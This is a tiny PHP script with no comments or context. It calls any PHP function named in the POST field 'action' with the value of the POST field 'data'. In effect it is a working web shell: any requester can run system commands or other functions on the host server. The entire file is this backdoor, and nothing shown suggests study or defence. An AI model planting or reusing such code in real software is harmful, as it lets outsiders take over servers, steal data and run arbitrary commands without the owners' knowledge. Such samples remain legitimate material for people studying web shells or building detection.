<?php
if(isset($_POST['action']) && !empty($_POST['action'])){
    $action = $_POST['action'];
    if(function_exists($action) && isset($_POST['data'])) {
        $action($_POST['data']);
    }
}
